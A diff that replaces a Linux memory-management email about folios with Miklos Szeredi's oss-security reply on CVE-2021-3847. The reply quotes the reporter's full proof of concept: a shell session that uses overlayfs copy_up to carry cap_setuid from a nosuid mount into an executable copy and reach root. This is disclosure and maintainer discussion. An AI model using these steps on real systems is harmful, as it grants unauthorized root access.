@@ -2,150 +2,196 @@ Return-Path: <linux-fsdevel-owner@vger.kernel.org>
 X-Original-To: lists+linux-fsdevel@lfdr.de
 Delivered-To: lists+linux-fsdevel@lfdr.de
 Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
-	by mail.lfdr.de (Postfix) with ESMTP id 0FBF7433A03
-	for <lists+linux-fsdevel@lfdr.de>; Tue, 19 Oct 2021 17:16:28 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id 80830433A45
+	for <lists+linux-fsdevel@lfdr.de>; Tue, 19 Oct 2021 17:26:15 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S232083AbhJSPSh (ORCPT <rfc822;lists+linux-fsdevel@lfdr.de>);
-        Tue, 19 Oct 2021 11:18:37 -0400
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:47492 "EHLO
+        id S233671AbhJSP20 (ORCPT <rfc822;lists+linux-fsdevel@lfdr.de>);
+        Tue, 19 Oct 2021 11:28:26 -0400
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:49794 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S231250AbhJSPSe (ORCPT
+        with ESMTP id S232051AbhJSP2Y (ORCPT
         <rfc822;linux-fsdevel@vger.kernel.org>);
-        Tue, 19 Oct 2021 11:18:34 -0400
-Received: from mail-qk1-x732.google.com (mail-qk1-x732.google.com [IPv6:2607:f8b0:4864:20::732])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 690A7C061746
-        for <linux-fsdevel@vger.kernel.org>; Tue, 19 Oct 2021 08:16:21 -0700 (PDT)
-Received: by mail-qk1-x732.google.com with SMTP id g20so272819qka.1
-        for <linux-fsdevel@vger.kernel.org>; Tue, 19 Oct 2021 08:16:21 -0700 (PDT)
+        Tue, 19 Oct 2021 11:28:24 -0400
+Received: from mail-ed1-x52c.google.com (mail-ed1-x52c.google.com [IPv6:2a00:1450:4864:20::52c])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id E94B7C06161C
+        for <linux-fsdevel@vger.kernel.org>; Tue, 19 Oct 2021 08:26:10 -0700 (PDT)
+Received: by mail-ed1-x52c.google.com with SMTP id r18so14517271edv.12
+        for <linux-fsdevel@vger.kernel.org>; Tue, 19 Oct 2021 08:26:10 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=cmpxchg-org.20210112.gappssmtp.com; s=20210112;
+        d=szeredi.hu; s=google;
         h=date:from:to:cc:subject:message-id:references:mime-version
-         :content-disposition:in-reply-to;
-        bh=z2QCsj8uoI1elGSwjIcPM3flWlmV5asRjFaV2+Zm7wQ=;
-        b=P0eGPUE0ED5s2q2cgVj1MBGSU0NFueMDTHHmFRDzaMGveNnY7eva5aqT9YKQ4ywom6
-         zIBle47EmTwcAGH0xgKkEuTEMYd+gvhyrjK32+CGng9rdAaUEaGnDlgvj43WQBoC1hUg
-         Fp039gNDJQjIHUPuAM6nPkJCi5ezTCcmovk4gOXKIV8ryUuMAN1CxV/T79DoYzhFDQYg
-         kbEdvYeuB4IMGQ+vpKB+O6oyDQ80i5ffweK5/54+rpeYMCPUuqWkQM7qDnXrsPY3o+SZ
-         tr/dVhtB+oqSceg4VpqqguL/+ocqLY1sTtqlBroX8n/oiI+dlCsxIaaWmMdnwA4tin94
-         r+dQ==
+         :content-disposition:content-transfer-encoding:in-reply-to;
+        bh=MZgniYHas0G8uMpaAIYxjaFr/MQdHHdVlrH0fW6i6VU=;
+        b=kikRDXXO//5oWFd0HxBCxAHfmNAvweGQLARgqO1XAM76kgovdBlz+K+gfFWHjMjWWc
+         4QuxtIjTL5JXfhF0Yl5IYLVwbZYFXWOQVbKCt+Yyunn3z8TABEdL6Il3UoGC4/sHGsRp
+         v4xhswV/4+02U8WvBoq5KGhEtQkTaDzFCTnrc=
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
         d=1e100.net; s=20210112;
         h=x-gm-message-state:date:from:to:cc:subject:message-id:references
-         :mime-version:content-disposition:in-reply-to;
-        bh=z2QCsj8uoI1elGSwjIcPM3flWlmV5asRjFaV2+Zm7wQ=;
-        b=kTnTe7LWC8MA1xdqYRSnyOz2iKsgHelASVMssYP8SqOyCqqFUgHEOPA3vHqvvtMujg
-         ajaqMBDmnO+udBzOAH8E8DateFhe/6V81mL1et0Mk3s+HfOrV92pyn4fjRd4wkBUIeKi
-         cmn/vzYKczMZEOq0vx8Js8vKXVP4FtO9xZj5nVhuxLCt6bSCWKPpT0uus4m36vtCZ15M
-         YvaWB3rZX+ezKpNK76gCsKQvG+W5gs3JZVtfvkkGffh7tq2hvoIrYjA9oPB3kTu1k313
-         Akjo0zrS3msSLmDmg6XsNt54+jcwKSH1vuMPjn+kWcvK4QLNVBuVDvt40eBCkvd0x6FF
-         Do1A==
-X-Gm-Message-State: AOAM531okWX38dL3PmxS+AVvh414aVvPx/40SCBxTDqxbYBbDgZa3yZc
-        TXSwcu9tLQQDvX1NfKFHY2tg0A==
-X-Google-Smtp-Source: ABdhPJwGYQB/TCQqWjql20jclqCkpzSoRFFVoS5J1OXAL1VgIP3+MgHBaeuDfu3E2NL2tHQgwsHbvg==
-X-Received: by 2002:a05:620a:45a4:: with SMTP id bp36mr457879qkb.51.1634656580587;
-        Tue, 19 Oct 2021 08:16:20 -0700 (PDT)
-Received: from localhost (cpe-98-15-154-102.hvc.res.rr.com. [98.15.154.102])
-        by smtp.gmail.com with ESMTPSA id z6sm734425qtj.90.2021.10.19.08.16.19
+         :mime-version:content-disposition:content-transfer-encoding
+         :in-reply-to;
+        bh=MZgniYHas0G8uMpaAIYxjaFr/MQdHHdVlrH0fW6i6VU=;
+        b=6bsFzn8CNpiyWitzbAQrdDkGVh4Iju+FfYEBREmKc68eqyMOUVdPLqxUQmlU9xEHPG
+         CzAjwgyohMx65j7aZzCIrEqhg/z+iSl/BkoawOdjYHc7VBKUA4Al8yAtdc1j1hlQqX/W
+         mmI+4cmw95azbP7JAUAifrvLedNT3sYHl/yXsRIlfH4U0FkyEmjryW6sp3D1j6uXpYY9
+         hDYQJI/Y7hNWVHQqKyRCjSQDcSDgI1tkNXuDvy9ZCA4fvV9IwYWVjLTt7+LVUAW0s9ja
+         BKSroR4tg4eIGPxkgn4gyql2Tw5kiloM8Ywyi2JGoy9ghQlhYZxkctTHJOWkLwxcfo0q
+         KJFw==
+X-Gm-Message-State: AOAM531ACtL1WCOZ9FBidmw+/BAABUrtZ9c6+zYeJxfK6gMT1dB4HxmN
+        RHHm/FqswMmLCiqfieQnw78285MxFd1THA==
+X-Google-Smtp-Source: ABdhPJxflk94TgsCYNCviF0dh0QHT8wwWTznQc8FeBreEiI/gHxpqdWHMP1PdH73T2CLuQBBoZrUmg==
+X-Received: by 2002:a17:906:8397:: with SMTP id p23mr40129688ejx.43.1634657016553;
+        Tue, 19 Oct 2021 08:23:36 -0700 (PDT)
+Received: from miu.piliscsaba.redhat.com (catv-86-101-169-16.catv.broadband.hu. [86.101.169.16])
+        by smtp.gmail.com with ESMTPSA id x13sm10394595ejv.64.2021.10.19.08.23.35
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Tue, 19 Oct 2021 08:16:19 -0700 (PDT)
-Date:   Tue, 19 Oct 2021 11:16:18 -0400
-From:   Johannes Weiner <hannes@cmpxchg.org>
-To:     "Kirill A. Shutemov" <kirill@shutemov.name>
-Cc:     Matthew Wilcox <willy@infradead.org>,
-        Kent Overstreet <kent.overstreet@gmail.com>,
-        Linus Torvalds <torvalds@linux-foundation.org>,
-        linux-mm@kvack.org, linux-fsdevel@vger.kernel.org,
-        linux-kernel@vger.kernel.org,
-        Andrew Morton <akpm@linux-foundation.org>,
-        "Darrick J. Wong" <djwong@kernel.org>,
-        Christoph Hellwig <hch@infradead.org>,
-        David Howells <dhowells@redhat.com>,
-        Hugh Dickins <hughd@google.com>
-Subject: Re: Folios for 5.15 request - Was: re: Folio discussion recap -
-Message-ID: <YW7hQlny+Go1K3LT@cmpxchg.org>
-References: <YUo20TzAlqz8Tceg@cmpxchg.org>
- <YUpC3oV4II+u+lzQ@casper.infradead.org>
- <YUpKbWDYqRB6eBV+@moria.home.lan>
- <YUpNLtlbNwdjTko0@moria.home.lan>
- <YUtHCle/giwHvLN1@cmpxchg.org>
- <YWpG1xlPbm7Jpf2b@casper.infradead.org>
- <YW2lKcqwBZGDCz6T@cmpxchg.org>
- <YW28vaoW7qNeX3GP@casper.infradead.org>
- <YW3tkuCUPVICvMBX@cmpxchg.org>
- <20211018231627.kqrnalsi74bgpoxu@box.shutemov.name>
+        Tue, 19 Oct 2021 08:23:35 -0700 (PDT)
+Date:   Tue, 19 Oct 2021 17:23:27 +0200
+From:   Miklos Szeredi <miklos@szeredi.hu>
+To:     oss-security@lists.openwall.com
+Cc:     linux-fsdevel@vger.kernel.org, linux-unionfs@vger.kernel.org,
+        Alon Zahavi <Alon.Zahavi@cyberark.com>,
+        Vegard Nossum <vegard.nossum@oracle.com>,
+        Thadeu Lima de Souza Cascardo <cascardo@canonical.com>,
+        Nir Chako <Nir.Chako@cyberark.com>,
+        Alon Zahavi <zahavi.alon@gmail.com>
+Subject: Re: [oss-security] CVE-2021-3847: OverlayFS - Potential Privilege
+ Escalation using overlays copy_up
+Message-ID: <YW7i72bOgRGmCs2O@miu.piliscsaba.redhat.com>
+References: <DB9P193MB140461EEF44F153D9F66FF958DB89@DB9P193MB1404.EURP193.PROD.OUTLOOK.COM>
+ <PAXP193MB1405A3EC41713BE9D524FBE48DB89@PAXP193MB1405.EURP193.PROD.OUTLOOK.COM>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: text/plain; charset=utf-8
 Content-Disposition: inline
-In-Reply-To: <20211018231627.kqrnalsi74bgpoxu@box.shutemov.name>
+Content-Transfer-Encoding: 8bit
+In-Reply-To: <PAXP193MB1405A3EC41713BE9D524FBE48DB89@PAXP193MB1405.EURP193.PROD.OUTLOOK.COM>
 Precedence: bulk
 List-ID: <linux-fsdevel.vger.kernel.org>
 X-Mailing-List: linux-fsdevel@vger.kernel.org
 
-On Tue, Oct 19, 2021 at 02:16:27AM +0300, Kirill A. Shutemov wrote:
-> On Mon, Oct 18, 2021 at 05:56:34PM -0400, Johannes Weiner wrote:
-> > > I don't think there will ever be consensus as long as you don't take
-> > > the concerns of other MM developers seriously.  On Friday's call, several
-> > > people working on using large pages for anon memory told you that using
-> > > folios for anon memory would make their lives easier, and you didn't care.
-> > 
-> > Nope, one person claimed that it would help, and I asked how. Not
-> > because I'm against typesafety, but because I wanted to know if there
-> > is an aspect in there that would specifically benefit from a shared
-> > folio type. I don't remember there being one, and I'm not against type
-> > safety for anon pages.
-> > 
-> > What several people *did* say at this meeting was whether you could
-> > drop the anon stuff for now until we have consensus.
+On Thu, Oct 14, 2021 at 06:30:53PM +0000, Alon Zahavi wrote:
 > 
-> My read on the meeting was that most of people had nothing against anon
-> stuff, but asked if Willy could drop anon parts to get past your
-> objections to move forward.
+> After disclosing the issue with the linux-distros mailing list, I am reporting the security issue publicly to here.
+> There is no patch available and may not be available for a long time because the kernel can’t enforce the mitigation proposed, as that would be a layering violation and could also possibly cause a regression.
+> This vulnerability was attached with CVE-2021-3847.
+> Here is the report that was initially sent:
 > 
-> You was the only person who was vocal against including anon pars. (Hugh
-> nodded to some of your points, but I don't really know his position on
-> folios in general and anon stuff in particular).
+> ## Bug Class
+> Escalation of privileges - Bypassing the security extended attribute attachment restrictions (in order to modify the security.capability xattr, a process will need CAP_SYS_ADMIN or CAP_SETFCAP).
+> # Technical Details
+> ## Summary:
+> An attacker with a low-privileged user on a Linux machine with an overlay mount which has a file capability in one of its layers may escalate his privileges up to root when copying a capable file from a nosuid mount into another mount.
+> ## In details:
+> If there is an overlay mount that one of its lower layers contains a file with capabilities and in case that the lower layer is a nosuid mount (which means the file capabilities are being ignored at execution), an attacker with low-privileges user can touch the file, which causes the overlayFS driver to copy_up the file with its capabilities into the upper layer. That way the attacker can now execute the file with the file's capabilities, thus escalating its privileges.
 
-Nobody likes to be the crazy person on the soapbox, so I asked Hugh in
-private a few weeks back. Quoting him, with permission:
+I think this is a misunderstanding about how overlayfs operates.  Mounting
+overlayfs is effectively a just-in-time version of "cp -a lowerdir upperdir".
+In other words if the admin creates an overlay where the lower layer is
+untrusted and the upper layer is trusted, then that act itself is the
+privilege escalation.
 
-: To the first and second order of approximation, you have been
-: speaking for me: but in a much more informed and constructive and
-: coherent and rational way than I would have managed myself.
+This is more formally documented in "Documentation/filesystems/overlayfs.rst"
+in the "Permission model" section.
 
-It's a broad and open-ended proposal with far reaching consequences,
-and not everybody has the time (or foolhardiness) to engage on that. I
-wouldn't count silence as approval - just like I don't see approval as
-a sign that a person took a hard look at all the implications.
+If this model is not clear, then maybe it needs to be spelled out more
+explicitly.  Perhaps even a warning message could be added to the kernel logs
+in case the lower mount is "nosuid".  But IMO erroring out on the copy-up or
+skipping copy up of certain attributes would make the cure worse than the
+disease.
 
-My only effort from the start has been working out unanswered
-questions in this proposal: Are compound pages the reliable, scalable,
-and memory-efficient way to do bigger page sizes? What's the scope of
-remaining tailpages where typesafety will continue to lack? How do we
-implement code and properties shared by folios and non-folio types
-(like mmap/fault code for folio and network and driver pages)?
+Let me know if I'm missing something.
 
-There are no satisfying answers to any of these questions, but that
-also isn't very surprising: it's a huge scope. Lack of answers isn't
-failure, it's just a sign that the step size is too large and too
-dependent on a speculative future. It would have been great to whittle
-things down to a more incremental and concrete first step, which would
-have allowed us to keep testing the project against reality as we go
-through all the myriad of uses and cornercases of struct page that no
-single person can keep straight in their head.
+Thanks,
+Miklos
 
-I'm grateful for the struct slab spinoff, I think it's exactly all of
-the above. I'm in full support of it and have dedicated time, effort
-and patches to help work out kinks that immediately and inevitably
-surfaced around the slab<->page boundary.
-
-I only hoped we could do the same for file pages first, learn from
-that, and then do anon pages; if they come out looking the same in the
-process, a unified folio would be a great trailing refactoring step.
-
-But alas here we are months later at the same impasse with the same
-open questions, and still talking in circles about speculative code.
-I don't have more time to invest into this, and I'm tired of the
-vitriol and ad-hominems both in public and in private channels.
-
-I'm not really sure how to exit this. The reasons for my NAK are still
-there. But I will no longer argue or stand in the way of the patches.
+> See attached image.
+> ## Build:
+> Any Linux machine with a support for overlayFS.
+> For example: AWS EC2 Ubuntu 20.04.
+> Mount a device to any folder.
+> Copy any file with capabilities into that folder.
+> Remount the device now with nosuid option.
+> mount an overlayFS mount where there are two layers. Make sure the lower directory is the directory with the capable file.
+> ## Execution:
+> As a low-priv user cd into the merged directory.
+> Execute touch capable_file
+> cd to the upper layer directory.
+> Execute the capable binary.
+> ## Expected Results:
+> When copying a capable file using a low privileges user, the file should be copied without any file capabilities. As the Linux kernel restricts the copying of a file with capabilities, so low-pric user should not be able to achieve this goal.
+> ## Observed Results:
+> The new file that appears in the upper layer directory have the same capabilities as the file that had been copied. This behavior occur probably because the overlay driver's process is the one responsible for the copying, and it copies the whole file with its extended attributes.
+> 
+> 
+> ########## Example ##########
+> # there are two mount in question
+> $ cd /home/user/overlayfs/
+> 
+> $ ls -l
+> drwxr-xr-x 3 user user   4096 Sep 19 14:07 lowerUSB
+> drwxrwxr-x 1 user user   4096 Sep 19 14:06 merge
+> drwxrwxr-x 2 user user   4096 Sep 14 13:32 test
+> drwxrwxr-x 2 user user   4096 Sep 19 14:06 upper
+> drwxrwxr-x 3 user user   4096 Sep 19 14:25 work
+> 
+> # there are two mount in question.
+> # lowerUSB is a mount of an USB, which has a capable file inside.
+> # IMPORTENT NOTE: This mount has "nosuid" option, so capabilities should be ignored while executing it.
+> # The second mount is the overlay mount. Its lower directory is `lowerUSB/` which is the first mount mentioned above. Its upper is just a regular directory on the root fs.
+> $ mount
+> /dev/sdd on /home/user/overlayfs/lowerUSB type ext4 (rw,nosuid,nodev,relatime,uhelper=udisks2)
+> overlay on /home/user/overlayfs/merge type overlay (rw,relatime,lowerdir=lowerUSB,upperdir=upper,workdir=work)
+> 
+> # The contents of all the directories.
+> $ ls -l *
+> lowerUSB:
+> total 40
+> -rwxr-xr-x 1 user user 17104 Sep 13 15:58 escalate
+> drwx------ 2 user user 16384 Jul  5 14:07 lost+found
+> 
+> merge:
+> total 40
+> -rwxr-xr-x 1 user user 17104 Sep 19 14:27 escalate
+> drwx------ 2 user user 16384 Jul  5 14:07 lost+found
+> 
+> test:
+> total 0
+> 
+> upper:
+> total 0
+> 
+> work:
+> total 4
+> d--------- 2 root root 4096 Sep 19 14:25 work
+> 
+> # escalate is an executable that set its uid and gid to 0.
+> $ getcap ./lowerUSB/escalate
+> ./lowerUSB/escalate = cap_setgid,cap_setuid+eip
+> 
+> $ id
+> uid=1000(user) gid=1000(user) groups=1000(user)
+> 
+> # When trying to execute ./lowerUSB/escalate, it does not work because it is a `nosuid` mount.
+> $ ./lowerUSB/escalate
+> [-] Failure
+> 
+> # Try to copy the binary with its capabilities.
+> # It should not work, because regular users are not allowed to copy the "security.capability" xattr.
+> $ cp --preserve=all ./lowerUSB/escalate ./test/escalate
+> cp: setting attribute 'security.capability' for 'security.capability': Operation not permitted
+> 
+> # Trigger the copy_up
+> $ touch ./merge/escalate
+> $ ls -l ./upper/
+> -rwxr-xr-x 1 user user 17K Sep 19 15:01 escalate
+> 
+> # The copy_up kept the binary capabilities (xattr)
+> $ getcap ./upper/escalate
+> ./upper/escalate = cap_setgid,cap_setuid+eip
+> 
+> # executing the binary, with the capabilities, so the privileges will escalate to root.
+> $ ./upper/escalate
+> $ id
+> uid=0(root) gid=0(root) groups=0(root)
+> 
+> 
